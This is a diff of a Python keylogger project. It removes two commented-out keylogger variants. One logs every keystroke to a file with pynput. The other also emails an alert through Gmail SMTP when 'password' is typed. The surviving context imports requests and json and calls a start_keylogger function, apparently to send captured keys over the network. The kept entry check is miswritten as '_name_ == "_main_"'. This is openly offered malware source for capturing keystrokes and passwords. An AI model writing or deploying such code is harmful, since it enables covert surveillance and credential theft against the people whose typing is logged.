@@ -1,19 +1,4 @@
-# from pynput import keyboard
-
-# def keyPressed(key):
-#     print(str(key))
-#     with open("keyfile.txt", 'a') as logKey:
-#         try:
-#             char = key.char
-#             logKey.write(char)
-#         except:
-#             print("Error getting char")
-
-# if __name__ == "__main__":
-#     listener = keyboard.Listener(on_press=keyPressed)
-#     listener.start()
-#     input()
-
+# Keyloggers project
 from pynput import keyboard
 import requests
 import json
@@ -82,40 +67,3 @@ def start_keylogger():
 
 if _name_ == "_main_":
     start_keylogger()
-
-
-
-
-
-
-
-
-
-
-
-# import smtplib
-# from pynput import keyboard
-
-# EMAIL_ADDRESS = "your_email@gmail.com"
-# EMAIL_PASSWORD = "your_password"
-
-# def send_email(message):
-#     with smtplib.SMTP('smtp.gmail.com', 587) as server:
-#         server.starttls()
-#         server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
-#         server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, f"Subject: Key Alert!\n\n{message}")
-
-# def keyPressed(key):
-#     with open("keyfile.txt", 'a') as logKey:
-#         try:
-#             char = key.char
-#             logKey.write(char)
-#             if "password" in char:  # Trigger email for specific text
-#                 send_email(f"Alert: Detected keyword 'password'!")
-#         except:
-#             logKey.write("[Special Key]")
-
-# if __name__ == "__main__":
-#     listener = keyboard.Listener(on_press=keyPressed)
-#     listener.start()
-#     input()
